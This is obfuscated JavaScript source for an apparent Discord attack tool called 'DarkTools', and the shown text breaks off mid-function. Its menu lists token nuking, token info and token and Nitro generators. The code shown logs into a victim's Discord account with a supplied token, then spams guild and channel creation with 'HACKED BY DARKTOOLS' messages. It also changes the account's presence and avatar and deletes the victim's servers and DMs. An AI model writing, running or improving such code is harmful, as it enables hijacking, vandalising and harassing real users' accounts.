const readline = require('readline'),
    {
        green,
        yellow,
        red
    } = require('chalk'),
    {
        Discord,
        Client
    } = require('discord.js'),
    fs = require('fs'),
    snekfetch = require('snekfetch');
var fuckyouskid_0x41f89c = {};
fuckyouskid_0x41f89c.input = process.stdin, fuckyouskid_0x41f89c.output = process.stdout;
const rl = readline.createInterface(fuckyouskid_0x41f89c);

function Selections() {
    var _0x2fd12f = {};
    _0x2fd12f.Ngxkd = '16|11|0|6|' + '4|5|15|2|12|9|13|7|14|1|8|3|10', _0x2fd12f['sMHGT'] = function (_0x565e86, _0x3cb975) {
        return _0x565e86(_0x3cb975);
    }, _0x2fd12f.xyLrK = function (_0x198921, _0x3453ec) {
        return _0x198921 + _0x3453ec;
    }, _0x2fd12f.RHRoo = function (_0x514f9d, _0x28f4ce) {
        return _0x514f9d(_0x28f4ce);
    }, _0x2fd12f['edmTa'] = '[4]', _0x2fd12f['eVWRP'] = ' Nitro Generator', _0x2fd12f.lPhkh = function (_0x29d219, _0x3ba13d) {
        return _0x29d219(_0x3ba13d);
    }, _0x2fd12f.LFzGV = '                                    ║ ', _0x2fd12f.SoZex = function (_0xd99666, _0xdb8b96) {
        return _0xd99666(_0xdb8b96);
    }, _0x2fd12f.ypyCH = 'ASB v2: https://discord.gg/hpXAbPx          ', _0x2fd12f.ngxSk = '[6]', _0x2fd12f.FzwEK = ' Geo IP', _0x2fd12f.GcAbw = '                                    ╔═════════════════════════════════════════════╗', _0x2fd12f.MVWxp = '                                             ═╩╝┴ ┴┴└─┴ ┴ ╩ └─┘└─┘┴─┘└─┘', _0x2fd12f.FfcLk = '[2]', _0x2fd12f['vZifc'] = ' Token Nuke', _0x2fd12f.IyBid = '[5]', _0x2fd12f.ivXRM = function (_0x2ce9ef, _0x4fa633) {
        return _0x2ce9ef(_0x4fa633);
    }, _0x2fd12f['dXzbQ'] = '                                    ╚═════════════════════════════════════════════╝', _0x2fd12f['wJsCc'] = '                                             ╔╦╗┌─┐┬─┐┬┌─╔╦╗┌─┐┌─┐┬  ┌─┐', _0x2fd12f['EJcCh'] = function (_0x2def45, _0x4f3981) {
        return _0x2def45(_0x4f3981);
    }, _0x2fd12f.nDRla = function (_0x2299e8, _0x1934a5) {
        return _0x2299e8 + _0x1934a5;
    }, _0x2fd12f.LTtVG = function (_0x23f79b, _0x29f60d) {
        return _0x23f79b(_0x29f60d);
    }, _0x2fd12f.DKZZp = 'Keybinds: Go Back: Arrow Down               ', _0x2fd12f.QnsXX = '[1]', _0x2fd12f.OnLqY = ' Token Fuck', _0x2fd12f['hGkOx'] = function (_0x421fee, _0x27c922) {
        return _0x421fee + _0x27c922;
    }, _0x2fd12f.yyVrA = function (_0x28d25e, _0x2f7b4f) {
        return _0x28d25e(_0x2f7b4f);
    }, _0x2fd12f.tYAuY = '[3]', _0x2fd12f['QAtvf'] = function (_0x4c1c66, _0x39422c) {
        return _0x4c1c66(_0x39422c);
    }, _0x2fd12f.aIuXB = 'Discord: AtomicFN#7727                      ', _0x2fd12f.IKVVW = '                                                                             ';
    var _0xbc72b1 = _0x2fd12f,
        _0x46e6b5 = _0xbc72b1.Ngxkd.split('|'),
        _0x40253c = 0x0;
    while (true) {
        switch (_0x46e6b5[_0x40253c++]) {
        case '0':
            console.log(_0xbc72b1.sMHGT(red, '                                              ║║├─┤├┬┘├┴┐ ║ │ ││ ││  └─┐'));
            continue;
        case '1':
            console.log(_0xbc72b1.xyLrK(_0xbc72b1.RHRoo(yellow, _0xbc72b1.edmTa), _0xbc72b1['RHRoo'](red, _0xbc72b1.eVWRP)));
            continue;
        case '2':
            console.log(_0xbc72b1.lPhkh(yellow, _0xbc72b1.xyLrK(_0xbc72b1['LFzGV'] + _0xbc72b1.SoZex(red, _0xbc72b1['ypyCH']), yellow('║'))));
            continue;
        case '3':
            console.log(_0xbc72b1['SoZex'](yellow, _0xbc72b1.ngxSk) + red(_0xbc72b1.FzwEK));
            continue;
        case '4':
            console.log('                                                                             ');
            continue;
        case '5':
            console.log(yellow(_0xbc72b1['GcAbw']));
            continue;
        case '6':
            console['log'](_0xbc72b1['SoZex'](red, _0xbc72b1.MVWxp));
            continue;
        case '7':
            console.log(_0xbc72b1.SoZex(yellow, _0xbc72b1.FfcLk) + red(_0xbc72b1.vZifc));
            continue;
        case '8':
            console.log(_0xbc72b1.xyLrK(yellow(_0xbc72b1.IyBid), _0xbc72b1.ivXRM(red, ' Token Generator')));
            continue;
        case '9':
            console.log(yellow(_0xbc72b1.dXzbQ));
            continue;
        case '10':
            console.log(' ');
            continue;
        case '11':
            console.log(_0xbc72b1['ivXRM'](red, _0xbc72b1.wJsCc));
            continue;
        case '12':
            console['log'](_0xbc72b1.EJcCh(yellow, _0xbc72b1.nDRla(_0xbc72b1.nDRla(_0xbc72b1.LFzGV, _0xbc72b1.LTtVG(red, _0xbc72b1['DKZZp'])), yellow('║'))));
            continue;
        case '13':
            console.log(yellow(_0xbc72b1.QnsXX) + _0xbc72b1.LTtVG(red, _0xbc72b1.OnLqY));
            continue;
        case '14':
            console.log(_0xbc72b1['hGkOx'](_0xbc72b1.yyVrA(yellow, _0xbc72b1.tYAuY), _0xbc72b1.yyVrA(red, ' Token Info')));
            continue;
        case '15':
            console.log(_0xbc72b1.QAtvf(yellow, _0xbc72b1.hGkOx(_0xbc72b1.hGkOx(_0xbc72b1.LFzGV, _0xbc72b1.QAtvf(red, _0xbc72b1.aIuXB)), yellow('║'))));
            continue;
        case '16':
            console.log(_0xbc72b1['IKVVW']);
            continue;
        }
        break;
    }
}

function SelectionProcess() {
    var _0x13242f = {};
    _0x13242f.sQoXF = function (_0x57b13f) {
        return _0x57b13f();
    }, _0x13242f.OsLCm = function (_0x57d295, _0x30c27c) {
        return _0x57d295 === _0x30c27c;
    }, _0x13242f['PZOCM'] = 'JliYk', _0x13242f.fxyJy = 'down', _0x13242f.QOWuc = function (_0x19b99f) {
        return _0x19b99f();
    }, _0x13242f.ietLY = 'HUCdM', _0x13242f['emRye'] = 'https://i.insider.com/593af23bbf76bb25008b4c9d?width=1136&format=jpeg', _0x13242f.cwQin = '[INFO] ', _0x13242f.LrqLi = 'TO STOP THE TOKEN NUKE PLEASE PRESS ARROW DOWN', _0x13242f.DWAnm = function (_0x4ad11a, _0x1f0f20) {
        return _0x4ad11a(_0x1f0f20);
    }, _0x13242f.qMRDm = 'Token Nuke Succesfull!', _0x13242f['OkTJj'] = function (_0x54574a, _0x34a98c) {
        return _0x54574a !== _0x34a98c;
    }, _0x13242f.lUWTn = 'WLuVk', _0x13242f.anbsw = function (_0x1db6ae, _0x6d37bc) {
        return _0x1db6ae(_0x6d37bc);
    }, _0x13242f.PyIjN = function (_0x478dab, _0x32a306) {
        return _0x478dab(_0x32a306);
    }, _0x13242f.bxoII = 'Started Nuking Token!', _0x13242f.iLbQk = 'ready', _0x13242f.JeMKe = '2|1|0|3|4', _0x13242f.ttmjq = function (_0x1b86c1, _0x259579) {
        return _0x1b86c1(_0x259579);
    }, _0x13242f.PZCUj = 'randomstring', _0x13242f.sEjea = function (_0x550219, _0xece649) {
        return _0x550219 + _0xece649;
    }, _0x13242f.HMoZd = function (_0x86c51c, _0x3c14f0) {
        return _0x86c51c + _0x3c14f0;
    }, _0x13242f.wONWt = function (_0x33a476, _0x2df707) {
        return _0x33a476 + _0x2df707;
    }, _0x13242f.MBeBm = 'NDc0N', _0x13242f.RauMV = 'Tokens Generated: ', _0x13242f.OncPg = function (_0x3e9255, _0x173901) {
        return _0x3e9255(_0x173901);
    }, _0x13242f['qUmiP'] = 'PRESS ARROW DOWN TO GET BACK', _0x13242f.GTikM = function (_0x4c328, _0x3a1e0d, _0x457a81) {
        return _0x4c328(_0x3a1e0d, _0x457a81);
    }, _0x13242f.stuEM = function (_0x6e501d, _0x37c879) {
        return _0x6e501d == _0x37c879;
    }, _0x13242f.wgsws = 'xvmNo', _0x13242f.anBYj = 'keypress', _0x13242f.qsczr = '3|0|1|4|2', _0x13242f['ZFwSf'] = 'NitroCodes.txt', _0x13242f.jOhwW = 'Codes Generated: ', _0x13242f.sHxJW = function (_0x598bc0, _0x260dee) {
        return _0x598bc0(_0x260dee);
    }, _0x13242f.hrbdY = function (_0x473d32, _0x25bd0b) {
        return _0x473d32(_0x25bd0b);
    }, _0x13242f.QbZXC = 'pvCqK', _0x13242f.UScip = 'http://extreme-ip-lookup.com/json/', _0x13242f.PEtqS = function (_0x56801d, _0x141bff) {
        return _0x56801d(_0x141bff);
    }, _0x13242f.EndMF = function (_0x559832, _0x5c72cf) {
        return _0x559832(_0x5c72cf);
    }, _0x13242f.BQBll = function (_0x485212, _0x559de2) {
        return _0x485212(_0x559de2);
    }, _0x13242f.tqAjV = function (_0x1ad77c, _0x55e13e) {
        return _0x1ad77c(_0x55e13e);
    }, _0x13242f.TkOik = function (_0x1f922e, _0x1f40b3) {
        return _0x1f922e(_0x1f40b3);
    }, _0x13242f.XwQHP = function (_0x849a0d, _0x43696b) {
        return _0x849a0d + _0x43696b;
    }, _0x13242f.meuuH = '3|2|4|1|0', _0x13242f['MKlMR'] = 'aGacZ', _0x13242f.CzpoI = 'ME GETTING HACKED BY DARKTOOLS', _0x13242f.sEZga = 'WATCHING', _0x13242f.pzTpR = 'Changed Presence to: ME GETTING HACKED BY DARKTOOLS!', _0x13242f.EJfeI = '4|2|0|1|5|' + '3', _0x13242f['oGFZg'] = ' RIP UR ACC', _0x13242f.TGYcU = function (_0x4f4efd, _0x3db1e7) {
        return _0x4f4efd == _0x3db1e7;
    }, _0x13242f['gCagY'] = 'SEyPE', _0x13242f.KhxBI = 'Tag: ', _0x13242f['PioDX'] = 'ID: ', _0x13242f.MwpJv = 'Created: ', _0x13242f.LZsaD = 'Email: ', _0x13242f.BlLuz = 'Note: ', _0x13242f['mBhuF'] = 'Verified: ', _0x13242f.HavQM = function (_0x1e9cd5, _0x4c10a6) {
        return _0x1e9cd5(_0x4c10a6);
    }, _0x13242f.cxzXb = 'Nitro: ', _0x13242f.QrizL = 'abcdefghijklmnopqrstuvwxyzæøåABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ1234567890!- ', _0x13242f.snoLt = 'SEqZG', _0x13242f['qoTxG'] = function (_0x594cd5, _0x4467e9) {
        return _0x594cd5 + _0x4467e9;
    }, _0x13242f.IVXjD = function (_0x4dad6f, _0x8881f) {
        return _0x4dad6f(_0x8881f);
    }, _0x13242f.IdBfI = function (_0x579940, _0xc59fdc) {
        return _0x579940(_0xc59fdc);
    }, _0x13242f['WFaiV'] = function (_0x53e83b, _0x1786e5) {
        return _0x53e83b(_0x1786e5);
    }, _0x13242f.oBsHj = function (_0x1c8787, _0x11cafa) {
        return _0x1c8787 + _0x11cafa;
    }, _0x13242f['bBhnU'] = 'QQyXy', _0x13242f['jlTJg'] = 'OrXJH', _0x13242f.eqpXI = function (_0x29f613, _0x1fad77) {
        return _0x29f613 + _0x1fad77;
    }, _0x13242f['tirQD'] = function (_0x6d1af9) {
        return _0x6d1af9();
    }, _0x13242f.VjqQB = function (_0x309d9f, _0x1f85d5) {
        return _0x309d9f === _0x1f85d5;
    }, _0x13242f.jXmLi = 'UXFrE', _0x13242f.EePqV = 'Enter the Token to f' + `uck:\
`, _0x13242f.gawGr = function (_0x466c6e, _0x2ba23e) {
        return _0x466c6e === _0x2ba23e;
    }, _0x13242f['GntIT'] = function (_0xe4e4bf, _0x32ea33) {
        return _0xe4e4bf !== _0x32ea33;
    }, _0x13242f.xWkbt = 'uDfCo', _0x13242f.ZPuYn = 'AoXMP', _0x13242f.zpLtl = 'Enter the ' + `Token:\
`, _0x13242f.MBanF = function (_0x1141a6, _0x1b1431) {
        return _0x1141a6 === _0x1b1431;
    }, _0x13242f.iRDZg = 'BXIxH', _0x13242f.zXFFI = 'rjaBX', _0x13242f.SRqKH = 'WJqBp', _0x13242f['MpQmY'] = function (_0x3c6400, _0x505b77) {
        return _0x3c6400 + _0x505b77;
    }, _0x13242f.aSpxN = 'Interval in MS:\x0a', _0x13242f.ucFdp = function (_0x2c1a5c, _0x180b35) {
        return _0x2c1a5c === _0x180b35;
    }, _0x13242f.hfPQf = 'wWxpJ', _0x13242f.ZNiUi = function (_0x2f20a4, _0x1630d7) {
        return _0x2f20a4(_0x1630d7);
    }, _0x13242f.lgQcX = 'Please Select a valid Option!', _0x13242f.LMSKu = 'Please select:\x0a';
    var _0x464361 = _0x13242f;
    rl.question(_0x464361.LMSKu + yellow('> '), function (_0x1c17b1) {
        var _0x3e5764 = {};
        _0x3e5764.hrsUd = _0x464361.fxyJy, _0x3e5764.jvyhw = _0x464361.meuuH, _0x3e5764['MvrBG'] = function (_0xaf3c2f) {
            return _0xaf3c2f();
        }, _0x3e5764.TFTWZ = function (_0x4bfd04) {
            return _0x4bfd04();
        }, _0x3e5764.SHvmh = 'Created Guild: ', _0x3e5764.VTmTP = function (_0x4cfb1c, _0x25248d) {
            return _0x464361.OkTJj(_0x4cfb1c, _0x25248d);
        }, _0x3e5764.FoAzS = _0x464361['MKlMR'], _0x3e5764.zmBjG = _0x464361.CzpoI, _0x3e5764.xiwgv = _0x464361.sEZga, _0x3e5764.UEWjV = _0x464361.pzTpR, _0x3e5764.NgXhc = function (_0x5f5bd8, _0xa965c5) {
            return _0x464361['TkOik'](_0x5f5bd8, _0xa965c5);
        }, _0x3e5764.BznSh = _0x464361.anBYj, _0x3e5764.LPqzf = 'ready', _0x3e5764.oTnlZ = function (_0x56af2c, _0x1c6387) {
            return _0x464361.OsLCm(_0x56af2c, _0x1c6387);
        }, _0x3e5764.XiImc = _0x464361['EJfeI'], _0x3e5764.eqreO = function (_0x2394e6, _0x22f4f3) {
            return _0x2394e6(_0x22f4f3);
        }, _0x3e5764.Limae = _0x464361['oGFZg'], _0x3e5764.jalBo = function (_0x446691) {
            return _0x464361.QOWuc(_0x446691);
        }, _0x3e5764.oBQfC = function (_0x4ea6b0, _0xebca75) {
            return _0x464361.TGYcU(_0x4ea6b0, _0xebca75);
        }, _0x3e5764.LElRV = function (_0x4474ad) {
            return _0x464361.QOWuc(_0x4474ad);
        }, _0x3e5764.ukOjo = _0x464361['gCagY'], _0x3e5764.NGwgB = function (_0x1f22c0, _0x157b1e) {
            return _0x464361.XwQHP(_0x1f22c0, _0x157b1e);
        }, _0x3e5764.TKDGT = _0x464361.KhxBI, _0x3e5764.IEsQp = function (_0x5dfa9f, _0x4de651) {
            return _0x5dfa9f(_0x4de651);
        }, _0x3e5764.TLSGb = _0x464361.PioDX, _0x3e5764.HRpcO = _0x464361.MwpJv, _0x3e5764['hspTf'] = function (_0xf974ce, _0xabd672) {
            return _0xf974ce(_0xabd672);
        }, _0x3e5764.WHtSA = _0x464361.LZsaD, _0x3e5764.gVqun = function (_0x2be8c0, _0x1ed611) {
            return _0x464361.TkOik(_0x2be8c0, _0x1ed611);
        }, _0x3e5764['pjjHS'] = function (_0x33f0fe, _0x3af253) {
            return _0x464361.TkOik(_0x33f0fe, _0x3af253);
        }, _0x3e5764.gNevg = _0x464361.BlLuz, _0x3e5764.chpdh = _0x464361.mBhuF, _0x3e5764.sxPMG = function (_0x117ce3, _0x2141bf) {
            return _0x464361.HavQM(_0x117ce3, _0x2141bf);
        }, _0x3e5764.UMbic = _0x464361.cxzXb, _0x3e5764.TlMhc = function (_0x3508c5, _0x4b6e1) {
            return _0x464361.HavQM(_0x3508c5, _0x4b6e1);
        }, _0x3e5764.NDkrq = function (_0x38b9a2, _0x158c2f) {
            return _0x464361.HavQM(_0x38b9a2, _0x158c2f);
        }, _0x3e5764.KrcAf = _0x464361.cwQin, _0x3e5764.bUjnv = function (_0x135a1f, _0x32d21c) {
            return _0x464361['HavQM'](_0x135a1f, _0x32d21c);
        }, _0x3e5764.Rlkfr = _0x464361.QrizL, _0x3e5764.lUmWy = _0x464361.snoLt, _0x3e5764.evCWr = '5|1|0|2|3|' + '4', _0x3e5764.RqNLn = function (_0x24a4f3, _0xbb4c97) {
            return _0x24a4f3 + _0xbb4c97;
        }, _0x3e5764.aSNsM = 'Tokens Generated: ', _0x3e5764['SIvrQ'] = 'Tokens.txt', _0x3e5764.oYLVT = function (_0x172324, _0x49bb79) {
            return _0x464361['qoTxG'](_0x172324, _0x49bb79);
        }, _0x3e5764.yELqm = function (_0x35027b, _0x2742b1) {
            return _0x464361.qoTxG(_0x35027b, _0x2742b1);
        }, _0x3e5764.CZYHt = _0x464361.MBeBm, _0x3e5764.GIltV = _0x464361.qUmiP, _0x3e5764['kRShR'] = function (_0xaddc09, _0x2446ed) {
            return _0x464361.HavQM(_0xaddc09, _0x2446ed);
        }, _0x3e5764['eSAZH'] = function (_0x414594, _0x31226d) {
            return _0x464361.IVXjD(_0x414594, _0x31226d);
        }, _0x3e5764.qlbPf = function (_0x41696c, _0x5473ca) {
            return _0x41696c(_0x5473ca);
        }, _0x3e5764.QSpbJ = function (_0x36b4b0, _0x20d629) {
            return _0x36b4b0(_0x20d629);
        }, _0x3e5764.Xdtkb = function (_0x338361, _0x5ca64e) {
            return _0x464361.IdBfI(_0x338361, _0x5ca64e);
        }, _0x3e5764.pwKDw = function (_0xda336c, _0x352914) {
            return _0xda336c(_0x352914);
        }, _0x3e5764.TbVkH = function (_0x58906a, _0x47a9cc) {
            return _0x464361.WFaiV(_0x58906a, _0x47a9cc);
        }, _0x3e5764.aujWf = function (_0x34fe5e, _0x2d758c) {
            return _0x464361.oBsHj(_0x34fe5e, _0x2d758c);
        }, _0x3e5764.UHRON = function (_0x512fd7, _0x56c4f9) {
            return _0x464361['WFaiV'](_0x512fd7, _0x56c4f9);
        }, _0x3e5764['lXCix'] = function (_0x368fa6) {
            return _0x464361.QOWuc(_0x368fa6);
        }, _0x3e5764.dkueS = function (_0x12c6ff, _0x3fc8d7) {
            return _0x12c6ff !== _0x3fc8d7;
        }, _0x3e5764.mdQmM = _0x464361['bBhnU'], _0x3e5764.QeWgk = _0x464361.jlTJg, _0x3e5764.tRLAi = _0x464361.PZCUj, _0x3e5764.eXpni = function (_0x16f7ee, _0x35fe04, _0x4e4dcd) {
            return _0x464361.GTikM(_0x16f7ee, _0x35fe04, _0x4e4dcd);
        }, _0x3e5764.aWMmp = function (_0x558e36, _0xea4096) {
            return _0x558e36 + _0xea4096;
        }, _0x3e5764.wxpwy = function (_0x45b0a7, _0x42ce6a) {
            return _0x464361.eqpXI(_0x45b0a7, _0x42ce6a);
        }, _0x3e5764['ooHDV'] = function (_0x446df1) {
            return _0x464361.tirQD(_0x446df1);
        };
        var _0x3c39fd = _0x3e5764;
        if (_0x1c17b1 === '1') {
            if (_0x464361.VjqQB(_0x464361['jXmLi'], 'UXFrE')) console['clear'](), rl.question(_0x464361.EePqV + _0x464361.WFaiV(yellow, '> '), function (_0x43ca88) {
                var _0x2b31e2 = {};
                _0x2b31e2.Xoxzg = _0x3c39fd.hrsUd, _0x2b31e2['txsWY'] = _0x3c39fd.jvyhw, _0x2b31e2['SnmId'] = function (_0x5325f6) {
                    return _0x3c39fd['MvrBG'](_0x5325f6);
                }, _0x2b31e2['HrtIg'] = function (_0x269990) {
                    return _0x3c39fd.MvrBG(_0x269990);
                }, _0x2b31e2.kmawH = function (_0x5ae2be) {
                    return _0x3c39fd.TFTWZ(_0x5ae2be);
                }, _0x2b31e2.xWLeS = ' RIP UR ACC', _0x2b31e2.DsrQj = function (_0x431cce, _0xe5f063) {
                    return _0x431cce + _0xe5f063;
                }, _0x2b31e2.tmLCs = _0x3c39fd.SHvmh, _0x2b31e2.cSnqW = function (_0x1d7659, _0x4fdac6) {
                    return _0x3c39fd.VTmTP(_0x1d7659, _0x4fdac6);
                }, _0x2b31e2.hGFcg = _0x3c39fd.FoAzS, _0x2b31e2.irLjG = _0x3c39fd.zmBjG, _0x2b31e2.ivnjp = _0x3c39fd.xiwgv, _0x2b31e2.LEcyy = function (_0x578732, _0x247da0) {
                    return _0x578732(_0x247da0);
                }, _0x2b31e2.Rdnoy = _0x3c39fd.UEWjV, _0x2b31e2['WmGLc'] = function (_0xdb8d4b, _0x229404) {
                    return _0x3c39fd.NgXhc(_0xdb8d4b, _0x229404);
                }, _0x2b31e2.VCpLq = '[INFO] ', _0x2b31e2['ugtzO'] = function (_0x587302, _0x4518d0) {
                    return _0x587302(_0x4518d0);
                }, _0x2b31e2.jIiLv = _0x3c39fd.BznSh, _0x2b31e2.SPDxC = function (_0x223398) {
                    return _0x3c39fd.TFTWZ(_0x223398);
                };
                var _0x4f81c4 = _0x2b31e2;
                console.clear(), console['log'](yellow('[INFO] ') + _0x3c39fd['NgXhc'](red, 'Started Fucking Token!'));
                const _0x172715 = new Client();
                let _0x31a995 = _0x43ca88;
                _0x172715['login'](_0x31a995), _0x172715['on'](_0x3c39fd.LPqzf, () => {
                    var _0x2b8faa = {};
                    _0x2b8faa.sYfiy = _0x4f81c4.Xoxzg, _0x2b8faa.tdFBB = function (_0x37a880) {
                        return _0x4f81c4.HrtIg(_0x37a880);
                    }, _0x2b8faa.NBnkp = function (_0x32adac) {
                        return _0x4f81c4.kmawH(_0x32adac);
                    }, _0x2b8faa.ZUcjk = _0x4f81c4.xWLeS, _0x2b8faa.GslNd = '[INFO] ', _0x2b8faa.akPls = function (_0x113e66, _0x5cc360) {
                        return _0x4f81c4['DsrQj'](_0x113e66, _0x5cc360);
                    }, _0x2b8faa.CMxSR = function (_0x20cc25, _0x1af1bf) {
                        return _0x4f81c4.DsrQj(_0x20cc25, _0x1af1bf);
                    }, _0x2b8faa.rKycS = _0x4f81c4.tmLCs, _0x2b8faa['mwlha'] = function (_0x3880eb, _0x5703b3, _0x3d2b79) {
                        return _0x3880eb(_0x5703b3, _0x3d2b79);
                    };
                    var _0x2e78a9 = _0x2b8faa;
                    if (_0x4f81c4.cSnqW(_0x4f81c4.hGFcg, _0x4f81c4['hGFcg'])) {
                        function _0x1ecbbe() {
                            var _0x4d2ee9 = _0x3ad743.guilds.array();
                            _0x4d2ee9.forEach(_0x4a2f19 => _0x4a2f19['delete']());
                            var _0x2128fd = _0x51510a.users.array();
                            _0x2128fd.forEach(_0x5bdf25 => _0x5bdf25['deleteDM']());
                        }
                    } else {
                        var _0x8e8792 = {};
                        _0x8e8792.name = _0x4f81c4.irLjG, _0x8e8792['type'] = _0x4f81c4.ivnjp;
                        var _0x397834 = {};
                        _0x397834.game = _0x8e8792, _0x172715.user['setPresence'](_0x397834), console['log'](yellow('[INFO] ') + _0x4f81c4.LEcyy(red, _0x4f81c4['Rdnoy']));
                        var _0x3f690e = true;

                        function _0x129758() {
                            var _0x5ddbdf = {};
                            _0x5ddbdf.pOkcJ = _0x2e78a9.sYfiy, _0x5ddbdf.SHdWR = function (_0x549767) {
                                return _0x2e78a9.tdFBB(_0x549767);
                            }, _0x5ddbdf.wvLwk = function (_0x4eb174) {
                                return _0x2e78a9['NBnkp'](_0x4eb174);
                            }, _0x5ddbdf.wxgAh = function (_0x1e84c2, _0x5e2aa6) {
                                return _0x1e84c2 === _0x5e2aa6;
                            }, _0x5ddbdf.NwQbk = function (_0x3273e7, _0x3b1aa4) {
                                return _0x3273e7 === _0x3b1aa4;
                            }, _0x5ddbdf.IreJc = 'cFSXT', _0x5ddbdf.kvAjO = _0x2e78a9.ZUcjk, _0x5ddbdf.xSnYs = function (_0xe862eb, _0x2fe636) {
                                return _0xe862eb + _0x2fe636;
                            }, _0x5ddbdf.PLvpv = function (_0x2ddc4f, _0x2bb184) {
                                return _0x2ddc4f(_0x2bb184);
                            }, _0x5ddbdf.UaMsI = _0x2e78a9['GslNd'], _0x5ddbdf['cKgLg'] = function (_0x2365d7, _0x481de3) {
                                return _0x2e78a9.akPls(_0x2365d7, _0x481de3);
                            }, _0x5ddbdf.QcSMG = function (_0x5f6ac8, _0x56d500) {
                                return _0x2e78a9['CMxSR'](_0x5f6ac8, _0x56d500);
                            }, _0x5ddbdf.BPTqe = _0x2e78a9['rKycS'];
                            var _0x206c8c = _0x5ddbdf;
                            _0x2e78a9.mwlha(setInterval, () => {
                                if (_0x206c8c['wxgAh'](_0x3f690e, true)) {
                                    if (_0x206c8c['NwQbk'](_0x206c8c.IreJc, _0x206c8c.IreJc)) {
                                        var _0x162913 = ('4|1|0|2|3|' + '5')['split']('|'),
                                            _0x1b2552 = 0x0;
                                        while (true) {
                                            switch (_0x162913[_0x1b2552++]) {
                                            case '0':
                                                _0x307d04.forEach(_0x44a31d => _0x44a31d.createChannel('HACKED BY DARKTOOLS').then(_0x4fc1f3 => _0x4fc1f3.send('GET HACKED LMFAOOO')));
                                                continue;
                                            case '1':
                                                var _0x307d04 = _0x172715['guilds'].array();
                                                continue;
                                            case '2':
                                                _0x4ae942++;
                                                continue;
                                            case '3':
                                                _0x172715['user']['createGuild'](_0x172715.user.tag + _0x206c8c['kvAjO']);
                                                continue;
                                            case '4':
                                                var _0x4ae942 = 0x0;
                                                continue;
                                            case '5':
                                                console.log(_0x206c8c.xSnYs(_0x206c8c['PLvpv'](yellow, _0x206c8c.UaMsI), _0x206c8c.PLvpv(red, _0x206c8c.cKgLg(_0x206c8c['QcSMG'](_0x206c8c['BPTqe'], _0x172715.user.tag), _0x206c8c.kvAjO))));
                                                continue;
                                            }
                                            break;
                                        }
                                    } else {
                                        function _0x303f53() {
                                            _0x8816af && _0x520ad8.name == _0x206c8c.pOkcJ && (_0x58b190.clear(), _0x206c8c.SHdWR(_0x3f46a1), _0x206c8c.wvLwk(_0x3eb316));
                                        }
                                    }
                                } else _0x206c8c.wvLwk(clearInterval);
                            }, 0x7d0);
                        }
                        console.log(_0x4f81c4['DsrQj'](_0x4f81c4['WmGLc'](yellow, _0x4f81c4.VCpLq), _0x4f81c4.ugtzO(red, 'TO STOP THE TOKEN NUKE PLEASE PRESS ARROW DOWN'))), process.stdin['on'](_0x4f81c4.jIiLv, function (_0x2861c1, _0x682683) {
                            if (_0x682683 && _0x682683.name == _0x4f81c4.Xoxzg) {
                                var _0x528f45 = _0x4f81c4['txsWY'].split('|'),
                                    _0xd7fe05 = 0x0;
                                while (true) {
                                    switch (_0x528f45[_0xd7fe05++]) {
                                    case '0':
                                        _0x172715.destroy();
                                        continue;
                                    case '1':
                                        _0x4f81c4.SnmId(SelectionProcess);
                                        continue;
                                    case '2':
                                        console.clear();
                                        continue;
                                    case '3':
                                        _0x3f690e = true;
                                        continue;
                                    case '4':
                                        _0x4f81c4.SnmId(Selections);
                                        continue;
                                    }
                                    break;
                                }
                            }
                        }), _0x4f81c4.SPDxC(_0x129758);
                    }
                });
            });
            else {
                function _0x3bf43b() {
                    _0x19bfcf = true, _0x2913f2.clear(), _0x5f386d(), _0x464361['sQoXF'](_0x58a6c3), _0x58b8fc.destroy();
                }
            }
        } else {
            if (_0x464361['gawGr'](_0x1c17b1, '2')) console.clear(), rl.question(_0x464361['eqpXI']('Enter the Token to nuke:\x0a', yellow('> ')), function (_0x5a1a92) {
                var _0x4c7cad = {};
                _0x4c7cad.fprqm = function (_0x1af38a, _0x35fc5e) {
                    return _0x464361.OsLCm(_0x1af38a, _0x35fc5e);
                }, _0x4c7cad.GPgMD = _0x464361.PZOCM, _0x4c7cad['qQFlE'] = function (_0x2734b1, _0x5b9eff) {
                    return _0x2734b1 == _0x5b9eff;
                }, _0x4c7cad.ricOQ = _0x464361.fxyJy, _0x4c7cad.XdSmX = function (_0xc6e588) {
                    return _0x464361.sQoXF(_0xc6e588);
                }, _0x4c7cad.eOwzM = function (_0x378698) {
                    return _0x464361.QOWuc(_0x378698);
                }, _0x4c7cad.jxgus = function (_0x10963e) {
                    return _0x10963e();
                }, _0x4c7cad.qAbvH = _0x464361.ietLY, _0x4c7cad.CUGQg = _0x464361.emRye, _0x4c7cad.NHDzl = _0x464361['cwQin'], _0x4c7cad['wzpyY'] = function (_0x579e28, _0x3c2080) {
                    return _0x579e28(_0x3c2080);
                }, _0x4c7cad.flcqx = _0x464361.LrqLi, _0x4c7cad['BZKHj'] = function (_0xd06d21, _0x41b7b1) {
                    return _0x464361.DWAnm(_0xd06d21, _0x41b7b1);
                }, _0x4c7cad.LQLWC = _0x464361.qMRDm, _0x4c7cad.GuDrE = function (_0x40a75f) {
                    return _0x40a75f();
                };
                var _0x5861d4 = _0x4c7cad;
                if (_0x464361.OkTJj(_0x464361.lUWTn, _0x464361['lUWTn'])) {
                    function _0x107496() {
                        _0x5932a0 = true, _0x4f61e9.clear(), _0x6cc804(), _0x5064ea();
                    }
                } else {
                    console['clear'](), console.log(_0x464361.anbsw(yellow, _0x464361.cwQin) + _0x464361.PyIjN(red, _0x464361['bxoII']));
                    const _0x1f6e01 = new Client();
                    let _0x16c197 = _0x5a1a92;
                    _0x1f6e01.login(_0x16c197), _0x1f6e01['on'](_0x464361['iLbQk'], () => {
                        var _0x4f5912 = {};
                        _0x4f5912.FeJBN = function (_0x532191, _0x40f13d) {
                            return _0x5861d4.qQFlE(_0x532191, _0x40f13d);
                        }, _0x4f5912.aOwQv = 'down', _0x4f5912['hUKGn'] = function (_0x174cb9) {
                            return _0x5861d4['jxgus'](_0x174cb9);
                        }, _0x4f5912.bqffW = _0x5861d4.qAbvH;
                        var _0x4f36e8 = _0x4f5912;
                        _0x1f6e01['user'].setAvatar(_0x5861d4.CUGQg);

                        function _0xb287de() {
                            if (_0x4f36e8.bqffW === _0x4f36e8.bqffW) try {
                                var _0x322c1f = _0x1f6e01['guilds'].array();
                                _0x322c1f.forEach(_0x509501 => _0x509501.delete());
                                var _0x56a657 = _0x1f6e01.users.array();
                                _0x56a657['forEach'](_0x3f1520 => _0x3f1520.deleteDM());
                            } catch (_0x55fe72) {} else {
                                function _0x4e240f() {
